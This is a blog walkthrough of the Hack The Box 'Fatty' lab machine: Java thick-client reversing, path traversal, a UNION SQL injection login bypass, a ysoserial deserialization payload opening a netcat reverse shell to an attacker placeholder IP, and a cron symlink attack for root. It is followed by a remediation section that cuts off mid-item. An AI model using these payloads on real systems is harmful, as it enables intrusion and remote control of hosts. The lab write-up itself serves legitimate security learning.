<!doctype html><html lang=en><head><title>Fatty HTB - Insane Linux Box Walkthrough :: VAPT Walkthroughs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Complete walkthrough of Fatty HTB machine featuring Java thick client exploitation, SQL injection privilege escalation, Java deserialization RCE, and cron job symlink attacks for root access"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://malayamanas.github.io/posts/fatty-htb-walkthrough/><link rel=stylesheet href=https://malayamanas.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://malayamanas.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://malayamanas.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://malayamanas.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://malayamanas.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://malayamanas.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://malayamanas.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://malayamanas.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://malayamanas.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://malayamanas.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://malayamanas.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://malayamanas.github.io/terminal.css><link rel="shortcut icon" href=https://malayamanas.github.io/favicon.png><link rel=apple-touch-icon href=https://malayamanas.github.io/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Fatty HTB - Insane Linux Box Walkthrough"><meta property="og:description" content="Complete walkthrough of Fatty HTB machine featuring Java thick client exploitation, SQL injection privilege escalation, Java deserialization RCE, and cron job symlink attacks for root access"><meta property="og:url" content="https://malayamanas.github.io/posts/fatty-htb-walkthrough/"><meta property="og:site_name" content="VAPT Walkthroughs"><meta property="og:image" content="https://malayamanas.github.io/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="HTB"><meta property="article:section" content="Linux"><meta property="article:published_time" content="2025-09-22 08:00:00 +0000 UTC"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://malayamanas.github.io/><div class=logo>Terminal</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;â–¾</li><li><ul class=menu__dropdown><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://malayamanas.github.io/posts/fatty-htb-walkthrough/>Fatty HTB - Insane Linux Box Walkthrough</a></h1><div class=post-meta><time class=post-date>2025-09-22</time></div><span class=post-tags>#<a href=https://malayamanas.github.io/tags/insane-linux/>insane-linux</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/java/>java</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/thick-client/>thick-client</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/ftp/>ftp</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/sql-injection/>sql-injection</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/deserialization/>deserialization</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/path-traversal/>path-traversal</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/reverse-engineering/>reverse-engineering</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/cron-exploitation/>cron-exploitation</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/symlink-attack/>symlink-attack</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/privilege-escalation/>privilege-escalation</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/docker/>docker</a>&nbsp;</span><div class=post-content><div><h1 id=fatty-htb---insane-linux-box-walkthrough>Fatty HTB - Insane Linux Box Walkthrough<a href=#fatty-htb---insane-linux-box-walkthrough class=hanchor arialabel=Anchor>#</a></h1><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/3bvKLj0akMM?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><h2 id=key-exploitation-steps-and-techniques-chronological-order>Key Exploitation Steps and Techniques (Chronological Order)<a href=#key-exploitation-steps-and-techniques-chronological-order class=hanchor arialabel=Anchor>#</a></h2><p>Below is a chronological extraction of the key exploitation steps and techniques used in the provided data for the &ldquo;Fatty&rdquo; box from Hack The Box, as described in the video transcript. The steps focus on the process of exploiting the thick Java client and gaining root access to the target system.</p><hr><h3 id=key-exploitation-steps-and-techniques-chronological-order-1>Key Exploitation Steps and Techniques (Chronological Order)<a href=#key-exploitation-steps-and-techniques-chronological-order-1 class=hanchor arialabel=Anchor>#</a></h3><ol><li><p><strong>Initial Reconnaissance with Nmap</strong></p><ul><li><strong>Technique</strong>: Port scanning using Nmap to identify open ports and services.</li><li><strong>Step</strong>: Ran <code>nmap -sC -sV -oA nmap/fatty [TARGET-IP]</code> to enumerate services and versions, identifying:<ul><li><strong>Port 21 (FTP)</strong>: Anonymous FTP login allowed, containing <code>fatty-client.jar</code> and several note files (<code>note.txt</code>, <code>note2.txt</code>, <code>note3.txt</code>).</li><li><strong>Port 22 (SSH)</strong>: Running on Debian.</li><li><strong>Port 1337</strong>: Identified as a hidden port for the Java server (based on <code>note.txt</code>).</li></ul></li><li><strong>Additional Scan</strong>: Performed a full port scan (<code>sudo nmap -p- -oA nmap/fatty-all-ports [TARGET-IP]</code>) to confirm additional ports (1338, 1339) as mirrors.</li></ul></li><li><p><strong>Downloading Files from FTP</strong></p><ul><li><strong>Technique</strong>: Recursive download using <code>wget</code> and manual FTP login to check for hidden files.</li><li><strong>Step</strong>:<ul><li>Used <code>wget -r ftp://[TARGET-IP]</code> to download all files from the FTP server, including <code>fatty-client.jar</code> and notes.</li><li>Logged into FTP with <code>ftp [TARGET-IP]</code> (anonymous login) and ran <code>dir -a</code> to confirm no hidden files were missed.</li><li>Analyzed notes:<ul><li><strong>Note 1</strong>: Mentioned the Java server port moved from 8000 to a hidden port (1337), with mirrors on 1338 and 1339.</li><li><strong>Note 2</strong>: Indicated the client requires Java 8 and a specific resolution for tiling window managers.</li><li><strong>Note 3</strong>: Provided credentials <code>qtc:clarabb</code> for the application.</li></ul></li></ul></li></ul></li><li><p><strong>Running the Java Client</strong></p><ul><li><strong>Technique</strong>: Executing the Java thick client and troubleshooting version compatibility.</li><li><strong>Step</strong>:<ul><li>Attempted to run <code>java -jar fatty-client.jar</code> but encountered errors due to Java version mismatch (system was on Java 11).</li><li>Used Java 8 explicitly: <code>/usr/lib/jvm/java-8-openjdk/bin/java -jar fatty-client.jar</code>.</li><li>Tested login with <code>test:test</code>, but the application froze, indicating a connection issue.</li></ul></li></ul></li><li><p><strong>Network Traffic Analysis</strong></p><ul><li><strong>Technique</strong>: Packet capture with <code>tcpdump</code> and proxying with Burp Suite and <code>socat</code> to intercept traffic.</li><li><strong>Step</strong>:<ul><li>Ran <code>sudo tcpdump -i tun0</code> and later <code>sudo tcpdump -i any udp port 53</code> to identify DNS resolution attempts for <code>server.fatty.htb</code>.</li><li>Added <code>server.fatty.htb</code> to <code>/etc/hosts</code> pointing to <code>127.0.0.1</code> to intercept traffic locally.</li><li>Attempted to proxy traffic through Burp Suite (port 8000) but failed, likely due to non-HTTP traffic or certificate pinning.</li><li>Used <code>socat</code> to forward traffic: <code>socat TCP-LISTEN:8000,fork TCP:[TARGET-IP]:1337</code>.</li><li>Successfully logged in with <code>qtc:clarabb</code> credentials, confirming application functionality.</li></ul></li></ul></li><li><p><strong>Exploring the Java Client GUI</strong></p><ul><li><strong>Technique</strong>: Manual interaction with the client GUI to identify functionality and potential vulnerabilities.</li><li><strong>Step</strong>:<ul><li>Navigated the GUI, noting disabled features (e.g., server status) and accessible ones (e.g., file browser, configs).</li><li>Observed that the file browser accessed server-side files (e.g., <code>sshd_config</code>, <code>security.txt</code>), suggesting a potential Local File Inclusion (LFI) vulnerability.</li><li>Attempted to access restricted files (e.g., <code>/etc/passwd</code>) but was restricted by server-side filtering.</li></ul></li></ul></li><li><p><strong>Decompiling the Java Client</strong></p><ul><li><strong>Technique</strong>: Reverse engineering using CFR decompiler to analyze the <code>fatty-client.jar</code> source code.</li><li><strong>Step</strong>:<ul><li>Decompiled <code>fatty-client.jar</code> using <code>java -jar cfr.jar --outputpath ./client fatty-client.jar</code>.</li><li>Analyzed the decompiled code in Visual Studio Code, focusing on <code>ClientGUITest.java</code> to understand login and function invocation logic.</li><li>Identified that the client communicates with the server via a <code>Connection</code> class and invokes methods through an <code>Invoker</code> class.</li></ul></li></ul></li><li><p><strong>Creating a Custom Java Exploit Program</strong></p><ul><li><strong>Technique</strong>: Building a custom Java program to interact with the <code>fatty-client.jar</code> as a library for streamlined exploitation.</li><li><strong>Step</strong>:<ul><li>Set up a new Java project in Eclipse, importing <code>fatty-client.jar</code> as an external library.</li><li>Created <code>Exploit.java</code> to replicate login functionality:<ul><li>Established a connection using <code>Connection.getConnection()</code>.</li><li>Created a <code>User</code> object with <code>qtc:clarabb</code> credentials and called <code>Connection.login()</code>.</li><li>Retrieved the user role (<code>Connection.getRoleName()</code>) and confirmed it as <code>user</code>.</li></ul></li><li>Tested restricted commands (e.g., <code>Invoker.uname()</code>, <code>Invoker.ipconfig()</code>) but received &ldquo;not allowed&rdquo; errors due to server-side role-based access control.</li></ul></li></ul></li><li><p><strong>Exploiting LFI Vulnerability</strong></p><ul><li><strong>Technique</strong>: Path traversal to bypass server-side filtering and download server-side files.</li><li><strong>Step</strong>:<ul><li>Used the <code>Invoker.showFiles()</code> method to list files in the parent directory (<code>../</code>) and identified <code>fatty-server.jar</code> and <code>start.sh</code>.</li><li>Modified the exploit to call <code>Invoker.open("../", "start.sh")</code> to retrieve the <code>start.sh</code> script, revealing Docker usage and server startup details.</li><li>Attempted to retrieve <code>fatty-server.jar</code> using <code>Invoker.open("../", "fatty-server.jar")</code>, but the binary file was corrupted due to string-based handling.</li><li>Modified the <code>Invoker</code> class to create a <code>binaryOpen()</code> method that returns a byte array instead of a string.</li><li>Unsealed the <code>fatty-client.jar</code> by editing <code>META-INF/MANIFEST.MF</code> to remove the <code>Sealed: true</code> attribute and deleting signature files to allow custom class overriding.</li><li>Successfully downloaded <code>fatty-server.jar</code> using the modified <code>binaryOpen()</code> and wrote it to disk using <code>FileOutputStream</code>.</li></ul></li></ul></li><li><p><strong>Decompiling and Analyzing the Server Code</strong></p><ul><li><strong>Technique</strong>: Reverse engineering the server code to identify vulnerabilities.</li><li><strong>Step</strong>:<ul><li>Decompiled <code>fatty-server.jar</code> using <code>java -jar cfr.jar --outputpath ./server fatty-server.jar</code>.</li><li>Analyzed the server code, identifying:<ul><li>A hardcoded MySQL password (<code>secure_database_powered_by_...</code>) for the <code>qtc</code> user.</li><li>A SQL query in <code>JavaDatabase.checkLogin()</code> vulnerable to SQL injection due to unsanitized user input.</li><li>A deserialization vulnerability in the <code>changePassword()</code> function, which accepts serialized user input and is restricted to admin roles.</li></ul></li></ul></li></ul></li><li><p><strong>SQL Injection to Gain Admin Role</strong></p><ul><li><strong>Technique</strong>: SQL injection to bypass authentication and elevate privileges.</li><li><strong>Step</strong>:<ul><li>Modified the <code>User</code> object in <code>Exploit.java</code> to set <code>hashed=false</code>, ensuring the username is passed unhashed to the server.</li><li>Crafted a SQL injection payload: <code>qtc' UNION SELECT 1, 'pleasesubscribe', 'root@ipsec.rocks', 'ipsec', 'admin' --</code>.</li><li>Successfully logged in as an admin, confirmed by <code>Connection.getRoleName()</code> returning <code>admin</code>.</li><li>Tested admin privileges by running <code>Invoker.ipconfig()</code>, which now executed successfully.</li></ul></li></ul></li><li><p><strong>Java Deserialization Exploit</strong></p><ul><li><strong>Technique</strong>: Crafting a malicious serialized payload using <code>ysoserial</code> to achieve remote code execution.</li><li><strong>Step</strong>:<ul><li>Created a new <code>exploitChangePassword()</code> method in the <code>Invoker</code> class to send a custom payload to the <code>changePassword()</code> function.</li><li>Used <code>ysoserial</code> to generate a deserialization payload: <code>java -jar ysoserial.jar CommonsCollections5 "nc [ATTACKER-IP] 9001 -e /bin/sh" | base64 -w0</code>.</li><li>Sent the payload via <code>Invoker.exploitChangePassword()</code>, establishing a reverse shell to the attacker&rsquo;s machine (<code>nc -lvnp 9001</code>).</li><li>Confirmed the shell was running in a Docker container with limited tools (no <code>bash</code>, <code>python</code>, or <code>script</code>).</li></ul></li></ul></li><li><p><strong>Privilege Escalation via Cron Job</strong></p><ul><li><strong>Technique</strong>: Exploiting a cron job to overwrite the root SSH <code>authorized_keys</code> file.</li><li><strong>Step</strong>:<ul><li>Discovered a cron job (<code>logpolar.sh</code>) running every minute, using <code>scp</code> to copy <code>opt/fatty/logs.tar</code> to a remote server.</li><li>Used <code>pspy64</code> to monitor processes and confirm the cron job behavior.</li><li>Created a symbolic link exploit:<ul><li>Created a directory <code>/dev/shm/exploit</code> and linked <code>logs.tar</code> to <code>/root/.ssh/authorized_keys</code> (<code>ln -s /root/.ssh/authorized_keys logs.tar</code>).</li><li>Created a tar archive containing the symbolic link: <code>tar cvf logs.tar -C exploit .</code>.</li><li>Copied the crafted <code>logs.tar</code> to <code>/opt/fatty/logs.tar</code>.</li></ul></li><li>Generated an SSH key pair (<code>ssh-keygen -f qtc</code>) and appended the public key to <code>/root/.ssh/authorized_keys</code>.</li><li>Waited for the cron job to overwrite <code>authorized_keys</code> with the malicious <code>logs.tar</code>, allowing SSH access as root (<code>ssh -i qtc root@[TARGET-IP]</code>).</li><li>Accessed <code>root.txt</code> to complete the exploit.</li></ul></li></ul></li></ol><hr><h3 id=summary-of-key-techniques>Summary of Key Techniques<a href=#summary-of-key-techniques class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Port Scanning and Service Enumeration</strong>: Used Nmap to identify open ports and services (FTP, SSH, custom Java server ports).</li><li><strong>File Retrieval via FTP</strong>: Downloaded critical files (<code>fatty-client.jar</code>, notes) using anonymous FTP access.</li><li><strong>Thick Client Reverse Engineering</strong>: Decompiled and analyzed the Java client using CFR and Visual Studio Code.</li><li><strong>Custom Exploit Development</strong>: Built a Java program to interact with the client&rsquo;s library, enabling programmatic exploitation.</li><li><strong>Local File Inclusion (LFI)</strong>: Exploited path traversal to retrieve server-side files (<code>start.sh</code>, <code>fatty-server.jar</code>).</li><li><strong>SQL Injection</strong>: Bypassed authentication to gain admin privileges via a UNION-based SQL injection.</li><li><strong>Java Deserialization</strong>: Used <code>ysoserial</code> to craft a payload for remote code execution, gaining a reverse shell.</li><li><strong>Cron Job Exploitation</strong>: Manipulated a cron job to overwrite the root SSH <code>authorized_keys</code> file, achieving root access.</li></ul><p>This sequence outlines the methodical approach to exploiting the &ldquo;Fatty&rdquo; box, leveraging multiple vulnerabilities in the Java thick client and server configuration.</p><h2 id=security-gaps-and-remediation>Security Gaps and Remediation<a href=#security-gaps-and-remediation class=hanchor arialabel=Anchor>#</a></h2><p>Below is a detailed list of the security gaps identified in the services and systems of the &ldquo;Fatty&rdquo; box from Hack The Box, as described in the provided transcript. Each gap is associated with a specific service or system, and I&rsquo;ve included recommended fixes, categorized as either source code fixes or configuration fixes, to address these vulnerabilities.</p><hr><h3 id=1-ftp-service-port-21>1. FTP Service (Port 21)<a href=#1-ftp-service-port-21 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gap</strong>: Anonymous FTP login allowed, exposing sensitive files.</p><ul><li><strong>Description</strong>: The FTP server permits anonymous logins, allowing anyone to download critical files such as <code>fatty-client.jar</code> and note files (<code>note.txt</code>, <code>note2.txt</code>, <code>note3.txt</code>) without authentication. This exposes application code and configuration details that facilitate further exploitation.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Disable anonymous FTP access by modifying the FTP server configuration (e.g., for <code>vsftpd</code>, set <code>anonymous_enable=NO</code> in <code>/etc/vsftpd.conf</code>).</li><li>Restrict FTP access to authenticated users only, using strong credentials and limiting access to specific IP ranges or users.</li><li>Remove sensitive files (e.g., <code>fatty-client.jar</code>, notes) from the FTP server&rsquo;s public directory or place them in a restricted directory accessible only to authorized users.</li></ul></li><li><strong>Source Code Fix</strong>: Not applicable, as this is a configuration issue with the FTP server rather than application code.</li></ul></li></ul><hr><h3 id=2-java-thick-client-fatty-clientjar>2. Java Thick Client (fatty-client.jar)<a href=#2-java-thick-client-fatty-clientjar class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gap</strong>: Client-side role-based access control enforcement.</p><ul><li><strong>Description</strong>: The Java client GUI disables certain features (e.g., server status) based on the user&rsquo;s role, but this enforcement is client-side. An attacker can modify the client code to enable restricted features, though server-side checks mitigated this in some cases.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Move all role-based access control logic to the server side. For example, in <code>ClientGUITest.java</code>, remove client-side checks (e.g., <code>setEnabled(true)</code>) and ensure the server validates all requests against the user&rsquo;s role before execution.</li><li>Implement server-side validation for all menu item actions, ensuring that commands like <code>uname</code> or <code>ipconfig</code> are only executed if the server confirms the user has the required permissions.</li></ul></li><li><strong>Configuration Fix</strong>: Not applicable, as this requires changes to the application&rsquo;s logic rather than server configuration.</li></ul></li></ul><p><strong>Gap</strong>: Hardcoded directory paths in file browser functionality.</p><ul><li><strong>Description</strong>: The file browser functionality appends user input to a hardcoded directory path (e.g., <code>/opt/fatty/</code>), limiting the LFI exploit&rsquo;s scope. However, insufficient input validation allows path traversal (e.g., <code>../</code>) to access files outside the intended directory.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>In the <code>Invoker</code> class&rsquo;s <code>showFiles()</code> and <code>open()</code> methods, implement strict input validation to sanitize user-provided paths, rejecting any input containing <code>../</code> or absolute paths.</li><li>Use a whitelist approach to restrict file access to a predefined set of directories or files, ensuring users cannot navigate outside the intended scope.</li><li>Normalize file paths to resolve <code>../</code> before processing (e.g., using Java&rsquo;s <code>Path.normalize()</code>).</li></ul></li><li><strong>Configuration Fix</strong>: Not applicable, as this is a coding flaw rather than a configuration issue.</li></ul></li></ul><p><strong>Gap</strong>: Lack of certificate pinning or proper TLS validation.</p><ul><li><strong>Description</strong>: The client&rsquo;s SSL connection to the server could be intercepted using tools like <code>socat</code> or Burp Suite, indicating weak or absent certificate pinning. This allows man-in-the-middle (MITM) attacks to observe or manipulate traffic.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Implement certificate pinning in the <code>Connection</code> class to validate the server&rsquo;s certificate against a known, trusted certificate or public key. Use Java&rsquo;s <code>SSLSocketFactory</code> with a custom <code>TrustManager</code> to enforce this.</li><li>Ensure the client rejects connections if the server&rsquo;s certificate does not match the expected fingerprint.</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Configure the server to use a valid, trusted SSL certificate issued by a recognized Certificate Authority (CA) instead of a self-signed certificate.</li><li>Enable strict TLS settings on the server (e.g., disable weak ciphers and enforce TLS 1.2 or higher).</li></ul></li></ul></li></ul><hr><h3 id=3-java-server-fatty-serverjar>3. Java Server (fatty-server.jar)<a href=#3-java-server-fatty-serverjar class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gap</strong>: SQL injection vulnerability in login functionality.</p><ul><li><strong>Description</strong>: The <code>JavaDatabase.checkLogin()</code> method constructs a SQL query using unsanitized user input (<code>user.getUsername()</code>), allowing SQL injection (e.g., <code>qtc' UNION SELECT 1, 'pleasesubscribe', 'root@ipsec.rocks', 'ipsec', 'admin' --</code>). This enables privilege escalation to an admin role.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Use prepared statements with parameterized queries to prevent SQL injection. For example, rewrite the query in <code>checkLogin()</code> as:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>PreparedStatement stmt <span style=color:#f92672>=</span> conn.<span style=color:#a6e22e>prepareStatement</span>(<span style=color:#e6db74>&#34;SELECT * FROM users WHERE username = ?&#34;</span>);
</span></span><span style=display:flex><span>stmt.<span style=color:#a6e22e>setString</span>(1, username);
</span></span><span style=display:flex><span>ResultSet rs <span style=color:#f92672>=</span> stmt.<span style=color:#a6e22e>executeQuery</span>();
</span></span></code></pre></div></li><li>Validate and sanitize all user inputs before passing them to the database.</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Restrict database permissions to limit the impact of SQL injection (e.g., grant the application user only <code>SELECT</code> permissions on the <code>users</code> table).</li><li>Enable query logging and monitoring to detect and alert on suspicious SQL queries.</li></ul></li></ul></li></ul><p><strong>Gap</strong>: Java deserialization vulnerability in <code>changePassword()</code> function.</p><ul><li><strong>Description</strong>: The <code>changePassword()</code> function deserializes user-supplied input, allowing attackers to send malicious serialized objects (e.g., via <code>ysoserial</code> with CommonsCollections5) to execute arbitrary code, leading to a reverse shell.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Avoid deserialization of user-controlled input entirely. If serialization is necessary, use a safe serialization framework (e.g., JSON with strict schema validation) instead of Java&rsquo;s <code>ObjectInputStream</code>.</li><li>Implement a whitelist of allowed classes for deserialization using a custom <code>ObjectInputFilter</code> (Java 9+) or a library like <code>SerialKiller</code> to block untrusted classes (e.g., <code>org.apache.commons.collections</code>).</li><li>If <code>changePassword()</code> requires serialized data, validate the input structure and restrict it to expected fields (e.g., username, password) before deserialization.</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Disable unnecessary Java libraries (e.g., Apache Commons Collections) on the server to reduce the attack surface for deserialization exploits.</li><li>Run the server with a security manager to restrict dangerous operations during deserialization.</li></ul></li></ul></li></ul><p><strong>Gap</strong>: Inadequate path traversal sanitization in file operations.</p><ul><li><strong>Description</strong>: The server&rsquo;s file operation logic (e.g., <code>open()</code> and <code>showFiles()</code>) attempts to prevent path traversal by replacing <code>../</code> but fails to handle cases like <code>../</code> without a trailing slash, allowing attackers to access files outside the intended directory (e.g., <code>fatty-server.jar</code>).</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Strengthen path sanitization in the server&rsquo;s file handling logic (e.g., in <code>Handler</code> or related classes) by using Java&rsquo;s <code>Path.normalize()</code> and <code>Path.toRealPath()</code> to resolve paths and reject any that escape the intended directory.</li><li>Implement a whitelist of allowed directories (e.g., <code>/opt/fatty/config</code>) and reject requests for files outside these paths.</li><li>Log and reject requests containing suspicious patterns (e.g., multiple <code>../</code> sequences).</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Run the server process with restricted file system permissions (e.g., using a non-root user with access only to <code>/opt/fatty</code>).</li><li>Use a chroot jail or container isolation to limit the server&rsquo;s file system access.</li></ul></li></ul></li></ul><p><strong>Gap</strong>: Hardcoded database credentials.</p><ul><li><strong>Description</strong>: The server code contains a hardcoded MySQL password (<code>secure_database_powered_by_...</code>) for the <code>qtc</code> user, which can be extracted by decompiling <code>fatty-server.jar</code>.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Remove hardcoded credentials from the source code. Instead, use environment variables or a secure configuration file (e.g., encrypted properties file) to store database credentials.</li><li>Example: Use <code>System.getenv("DB_PASSWORD")</code> to retrieve the password from an environment variable.</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Store credentials in a secure vault (e.g., HashiCorp Vault) or a configuration file with restricted permissions (e.g., <code>chmod 600 /opt/fatty/db.conf</code>).</li><li>Restrict database access to the minimum necessary permissions and use a unique, strong password for the <code>qtc</code> user.</li></ul></li></ul></li></ul><hr><h3 id=4-ssh-service-port-22>4. SSH Service (Port 22)<a href=#4-ssh-service-port-22 class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gap</strong>: Public key authentication only, with no password fallback.</p><ul><li><strong>Description</strong>: The SSH server only allows public key authentication, but the <code>authorized_keys</code> file is writable due to a cron job exploit, allowing attackers to insert their own keys.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Restrict write access to <code>/root/.ssh/authorized_keys</code> (e.g., <code>chmod 600 /root/.ssh/authorized_keys</code> and ensure the directory is owned by <code>root</code> with <code>chmod 700 /root/.ssh</code>).</li><li>Disable root login in the SSH configuration (<code>PermitRootLogin no</code> in <code>/etc/ssh/sshd_config</code>).</li><li>Implement IP-based access controls (e.g., using <code>iptables</code> or <code>AllowUsers</code> in <code>sshd_config</code>) to limit SSH access to trusted IPs.</li></ul></li><li><strong>Source Code Fix</strong>: Not applicable, as this is a configuration issue with the SSH service.</li></ul></li></ul><hr><h3 id=5-cron-job-logpolarsh>5. Cron Job (logpolar.sh)<a href=#5-cron-job-logpolarsh class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gap</strong>: Cron job overwrites files without validation, enabling symbolic link attacks.</p><ul><li><strong>Description</strong>: The <code>logpolar.sh</code> cron job runs as root every minute, copying <code>/opt/fatty/logs.tar</code> to a remote server via <code>scp</code>. Attackers can create a symbolic link from <code>logs.tar</code> to <code>/root/.ssh/authorized_keys</code>, causing the cron job to overwrite the <code>authorized_keys</code> file with attacker-controlled content.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>:<ul><li>Modify the cron job script to validate the contents of <code>logs.tar</code> before copying. For example, use <code>tar -tvf logs.tar</code> to check for symbolic links and reject archives containing them.</li><li>Implement file integrity checks (e.g., checksums) to ensure <code>logs.tar</code> is not tampered with before processing.</li></ul></li><li><strong>Configuration Fix</strong>:<ul><li>Run the cron job as a non-root user with restricted permissions to prevent overwriting sensitive files like <code>/root/.ssh/authorized_keys</code>.</li><li>Use a dedicated directory for cron job outputs (e.g., <code>/var/log/fatty</code>) with strict permissions (<code>chmod 700</code>, owned by a non-root user).</li><li>Disable <code>scp</code> in the cron job and use a more secure file transfer mechanism (e.g., <code>rsync</code> with <code>--no-links</code> to reject symbolic links).</li><li>Implement a file system monitoring tool (e.g., <code>auditd</code>) to detect and alert on unauthorized changes to sensitive files.</li></ul></li></ul></li></ul><p><strong>Gap</strong>: Cron job runs in an insecure environment.</p><ul><li><strong>Description</strong>: The cron job operates in a Docker container with excessive permissions, allowing attackers to manipulate files in <code>/opt/fatty</code> and execute commands as root.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Run the Docker container with a non-root user and use Docker&rsquo;s user namespace feature to map container root to a non-privileged host user.</li><li>Apply the principle of least privilege by mounting only the necessary directories (e.g., <code>/opt/fatty/logs</code>) with read-only access where possible.</li><li>Use Docker&rsquo;s <code>--cap-drop</code> option to remove unnecessary capabilities (e.g., <code>CAP_DAC_OVERRIDE</code>) that allow file permission changes.</li><li>Restrict cron job access to specific files using AppArmor or SELinux profiles to prevent unauthorized file operations.</li></ul></li><li><strong>Source Code Fix</strong>: Not applicable, as this is a configuration issue with the cron job and Docker environment.</li></ul></li></ul><hr><h3 id=6-docker-container>6. Docker Container<a href=#6-docker-container class=hanchor arialabel=Anchor>#</a></h3><p><strong>Gap</strong>: Overly permissive container environment.</p><ul><li><strong>Description</strong>: The Docker container hosting the Java server and cron job allows execution of sensitive operations (e.g., file creation in <code>/opt/fatty</code>, symbolic link creation) and includes tools like <code>wget</code> and <code>tar</code>, which facilitate exploitation.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>:<ul><li>Use a minimal base image (e.g., <code>alpine</code>) for the Docker container to reduce the attack surface by excluding unnecessary tools (e.g., <code>wget</code>, <code>tar</code>).</li><li>Implement a read-only file system for the container (<code>docker run --read-only</code>) except for specific directories requiring write access (e.g., <code>/opt/fatty/logs</code> with a tmpfs mount).</li><li>Drop all unnecessary Linux capabilities (e.g., <code>docker run --cap-drop all --cap-add NET_BIND_SERVICE</code>) to limit the container&rsquo;s ability to perform privileged operations.</li><li>Use Docker&rsquo;s seccomp profile to restrict syscalls (e.g., block <code>symlink</code> or <code>chown</code>).</li></ul></li><li><strong>Source Code Fix</strong>: Not applicable, as this is a configuration issue with the Docker setup.</li></ul></li></ul><p><strong>Gap</strong>: Lack of network isolation.</p><ul><li><strong>Description</strong>: 